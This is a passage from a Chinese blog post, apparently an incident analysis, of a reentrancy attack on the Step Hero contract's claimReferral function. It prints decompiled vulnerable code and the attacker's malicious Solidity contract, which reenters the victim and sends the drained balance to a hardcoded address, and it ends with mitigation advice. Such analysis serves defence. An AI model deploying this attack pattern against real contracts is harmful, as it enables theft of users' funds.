&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0], Error(&lt;span style="color:#cd5555">&amp;#39;not-enough-money&amp;#39;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b452cd">0x2d1e&lt;/span>(varg0, owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0], &lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0] = &lt;span style="color:#b452cd">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> emit &lt;span style="color:#b452cd">0x9c21c092f05b64df5ae0cbf557b9bf4e9695cdbeaa13fcf9a0831bce847f0cfb&lt;/span>(&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>, varg0, owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>攻击者可以重复调用重新调用 &lt;code>claimReferral&lt;/code>，从而在清零前多次获取奖励。&lt;/p>
&lt;p>具体发送的函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-solidity" data-lang="solidity">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#b452cd">0x2d1e&lt;/span>(&lt;span style="color:#00688b;font-weight:bold">address&lt;/span> varg0, &lt;span style="color:#00688b;font-weight:bold">uint256&lt;/span> varg1, &lt;span style="color:#00688b;font-weight:bold">address&lt;/span> varg2) &lt;span style="color:#8b008b;font-weight:bold">private&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (varg0) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MEM[MEM[&lt;span style="color:#b452cd">64&lt;/span>] + &lt;span style="color:#b452cd">36&lt;/span>] = varg2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MEM[MEM[&lt;span style="color:#b452cd">64&lt;/span>] + &lt;span style="color:#b452cd">68&lt;/span>] = varg1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b452cd">0x2c96&lt;/span>(&lt;span style="color:#b452cd">100&lt;/span> + MEM[&lt;span style="color:#b452cd">64&lt;/span>], &lt;span style="color:#b452cd">0xa9059cbb00000000000000000000000000000000000000000000000000000000&lt;/span>, varg0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">return&lt;/span> ;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v0, &lt;span style="color:#228b22">/* uint256 */&lt;/span> v1 = varg2.&lt;span style="color:#658b00">call&lt;/span>().&lt;span style="color:#658b00">value&lt;/span>(varg1).&lt;span style="color:#658b00">gas&lt;/span>(&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">gas&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (RETURNDATASIZE() != &lt;span style="color:#b452cd">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> &lt;span style="color:#00688b;font-weight:bold">bytes&lt;/span>[](RETURNDATASIZE());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 = v2.&lt;span style="color:#658b00">data&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RETURNDATACOPY(v1, &lt;span style="color:#b452cd">0&lt;/span>, RETURNDATASIZE());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(v0, Error(&lt;span style="color:#cd5555">&amp;#39;transfer-BNB-failed&amp;#39;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">return&lt;/span> ;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>另外这里展示下黑客用来实现反复调用的第三部分恶意合约：
(使用LLM处理了一下)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-solidity" data-lang="solidity">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">// SPDX-License-Identifier: MIT
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">pragma solidity&lt;/span> ^&lt;span style="color:#b452cd">0&lt;/span>.&lt;span style="color:#b452cd">8&lt;/span>.&lt;span style="color:#b452cd">20&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">contract&lt;/span> &lt;span style="color:#008b45;font-weight:bold">TokenHandler&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b;font-weight:bold">address&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">private&lt;/span> owner;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b;font-weight:bold">address&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">private&lt;/span> token1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b;font-weight:bold">address&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">private&lt;/span> token2 = &lt;span style="color:#b452cd">0xFb1cC1548d039f14b02cfF9ae86757edD2cdB8A5&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">constructor&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> owner = &lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">modifier&lt;/span> &lt;span style="color:#008b45">onlyOwner&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span> == owner, &lt;span style="color:#cd5555">&amp;#34;invalid sender&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">_&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">func_6f2db99c&lt;/span>() &lt;span style="color:#8b008b;font-weight:bold">external&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 调用 owner 的某个函数 (e61aee51)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#228b22">//重复调用claimReferral函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success, ) = owner.&lt;span style="color:#658b00">call&lt;/span>(&lt;span style="color:#658b00">abi&lt;/span>.&lt;span style="color:#658b00">encodeWithSignature&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;e61aee51()&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">withdraw&lt;/span>(&lt;span style="color:#00688b;font-weight:bold">address&lt;/span> token, &lt;span style="color:#00688b;font-weight:bold">uint256&lt;/span> amount) &lt;span style="color:#8b008b;font-weight:bold">external&lt;/span> onlyOwner {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 获取 token 在调用者地址的余额
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success1, &lt;span style="color:#00688b;font-weight:bold">bytes&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">memory&lt;/span> &lt;span style="color:#658b00">data&lt;/span>) = token.&lt;span style="color:#658b00">call&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">abi&lt;/span>.&lt;span style="color:#658b00">encodeWithSelector&lt;/span>(&lt;span style="color:#b452cd">0x70a08231&lt;/span>, &lt;span style="color:#00688b;font-weight:bold">address&lt;/span>(&lt;span style="color:#658b00">this&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00688b;font-weight:bold">uint256&lt;/span> &lt;span style="color:#658b00">balance&lt;/span> = &lt;span style="color:#658b00">abi&lt;/span>.&lt;span style="color:#658b00">decode&lt;/span>(&lt;span style="color:#658b00">data&lt;/span>, (&lt;span style="color:#00688b;font-weight:bold">uint256&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 调用 withdraw (0x2e1a7d4d)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success2, ) = token.&lt;span style="color:#658b00">call&lt;/span>(&lt;span style="color:#658b00">abi&lt;/span>.&lt;span style="color:#658b00">encodeWithSelector&lt;/span>(&lt;span style="color:#b452cd">0x2e1a7d4d&lt;/span>, &lt;span style="color:#658b00">balance&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 调用 token 的 transfer 函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success3, ) = token.&lt;span style="color:#658b00">call&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">abi&lt;/span>.&lt;span style="color:#658b00">encodeWithSelector&lt;/span>(&lt;span style="color:#b452cd">0xa9059cbb&lt;/span>, &lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>, &lt;span style="color:#658b00">balance&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success3);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 向 msg.sender 发送 1 wei
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success4, ) = &lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>.&lt;span style="color:#658b00">call&lt;/span>{&lt;span style="color:#658b00">value&lt;/span>: &lt;span style="color:#b452cd">1&lt;/span>}(&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 向 token2 发送当前合约余额
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success5, ) = token2.&lt;span style="color:#658b00">call&lt;/span>{&lt;span style="color:#658b00">value&lt;/span>: &lt;span style="color:#00688b;font-weight:bold">address&lt;/span>(&lt;span style="color:#658b00">this&lt;/span>).&lt;span style="color:#658b00">balance&lt;/span>}(&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success5);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">executeCall&lt;/span>() &lt;span style="color:#8b008b;font-weight:bold">internal&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 复杂的外部调用逻辑，可能涉及 delegatecall 或其他操作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#228b22">// 这里简化表示
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success, ) = token1.&lt;span style="color:#658b00">call&lt;/span>{&lt;span style="color:#658b00">value&lt;/span>: &lt;span style="color:#00688b;font-weight:bold">address&lt;/span>(&lt;span style="color:#658b00">this&lt;/span>).&lt;span style="color:#658b00">balance&lt;/span>}(&lt;span style="color:#cd5555">&amp;#34;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success, &lt;span style="color:#cd5555">&amp;#34;call failed&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#228b22">// 调用 token1 的函数 0x50eb1dfe
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> (&lt;span style="color:#00688b;font-weight:bold">bool&lt;/span> success2, ) = token1.&lt;span style="color:#658b00">call&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">abi&lt;/span>.&lt;span style="color:#658b00">encodeWithSelector&lt;/span>(&lt;span style="color:#b452cd">0x50eb1dfe&lt;/span>, token2, &lt;span style="color:#00688b;font-weight:bold">address&lt;/span>(&lt;span style="color:#658b00">this&lt;/span>).&lt;span style="color:#658b00">balance&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(success2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="解决方案">解决方案&lt;/h2>
&lt;p>为了防止类似的重入攻击，可以采取以下措施：&lt;/p>
&lt;ol>
&lt;li>&lt;strong>使用 Checks-Effects-Interactions 模式&lt;/strong>：
&lt;ul>
&lt;li>先更新状态，再进行外部调用，以避免重入风险。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>使用 &lt;code>ReentrancyGuard&lt;/code>&lt;/strong>：
&lt;ul>
&lt;li>通过 OpenZeppelin 提供的 &lt;code>nonReentrant&lt;/code> 修饰符，防止函数的嵌套调用。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>避免直接调用 &lt;code>call&lt;/code> 进行转账&lt;/strong>：
&lt;ul>
&lt;li>推荐使用 &lt;code>transfer&lt;/code> 或 &lt;code>send&lt;/code>，虽然限制了 GAS，但能降低重入攻击的风险。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
- https://passi0n1.github.io/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/ - Rise. 本站遵循 CC-BY-NC 4.0 协议</description></item></channel></rss>